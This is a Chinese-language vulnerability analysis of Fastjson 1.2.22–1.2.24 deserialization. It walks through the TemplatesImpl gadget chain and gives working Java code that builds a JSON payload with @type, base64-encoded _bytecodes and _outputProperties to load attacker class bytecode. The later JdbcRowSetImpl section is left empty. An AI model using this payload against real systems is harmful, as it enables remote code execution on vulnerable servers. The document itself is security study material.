# FastJson1.2.22-1.2.24 反序列化分析

## 1.漏洞原理

FastJson 反序列化是因为未对`@type`字段进行有效的校验导致可以传入恶意的类且反序列化的时候会自动调用`setter`和无参构造器，在某些情况下会调用`getter`，当这些方法存在利用点的时候，我们通过传入可控利用点成员变量进行攻击利用。

Fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用

## 2.利用分析

### 2.1 TemplateImpl

#### (1).环境配置

```xml
  <dependency>
      <groupId>com.alibaba</groupId>
      <artifactId>fastjson</artifactId>
      <version>1.2.22</version>
  </dependency>
```

#### (2).利用链分析

在CC3中，有涉及到关于`TemplatesImpl`链的利用，其中涉及到3个变量为：`_name、_bytecodes、_tfactory`。在刚开始的漏洞原理中提到，fastjson在解析json字符串的时候，会去调用getter方法，

所以说，只解析的json字符串中存在`_outputProperties`的键值对，那么在解析的过程中会调用到`TemplatesImpl#getOutputProperties()`，代码如下：

![image-20240416150617547](./img/image-20240416150617547.png)

然后再接着调用`newTransformer()`后就是字节码的加载，这部分内容可以参考CC3,了解这一点之后，可能会想立马构造payload，但是能成功吗？如果进行的构造如下：

```java
  byte[] bytes = Files.readAllBytes(Paths.get("Exp.class"));
  String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
          "\"_bytecodes\":"+ Arrays.toString(bytes) +"," +
          "'_name':'me7eorite'," +
          "'_tfactory':{ }," +
          "\"_outputProperties\":{ }" +
          "}";
  Object obj = JSON.parseObject(text,Feature.SupportNonPublicField);
```

编译器是会产生格式错误的报错，显然这种方式是不行的，fastjson应该有自己的处理逻辑，所以往下需要分析一下它的解析过程。



在FastJson解析过程中，关键代码位于`DefaultJSONParser#parseObject()`中，其中关键位置如下：

![image-20240416151603853](./img/image-20240416151603853.png)

在该位置，通过传入的`@type`获取到需要转化的类，对于后续版本中，该类还会涉及到黑名单的绕过。

往下就涉及到field的处理，主要的处理方式是在于`ObjectArrayCodec#deserialze(...)`中

![image-20240416155420886](./img/image-20240416155420886.png)

传入后会先判断token的类型，然后采取指定的操作方式，例如：传入的是`_bytecodes`后会进行base64解码：

![image-20240416155239841](./img/image-20240416155239841.png)

根据以上的分析，这个构造方式就很清晰的：

1. 利用`TemplatesImpl`触发，需要`_name、_tfactory、_bytecodes`变量
2. 为了触发getter，需要定义`_outputProperties`
3. `_bytecodes`赋值的时候存在base64解码，需要编码。

修改以上的payload，增加一个base64编码即可：

```java
  byte[] bytes = Files.readAllBytes(Paths.get("/Users/me7eorite/Documents/GitHub/Learning-Demo/JavaStudy/target/classes/Exp.class"));
  String s = Base64.getEncoder().encodeToString(bytes);

  String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
          "\"_bytecodes\":[\""+s+"\"]," +
          "'_name':'me7eorite'," +
          "'_tfactory':{ }," +
          "\"_outputProperties\":{ }" +
          "}";
  Object obj = JSON.parseObject(text,Feature.SupportNonPublicField);
```

这里还涉及到一点，由于配置是是类中的私有字段，需要配置`Feature.SupportNonPublicField`。

### 2.2 JdbcRowSetImpl

#### (1).环境配置







#### (2).利用链分析

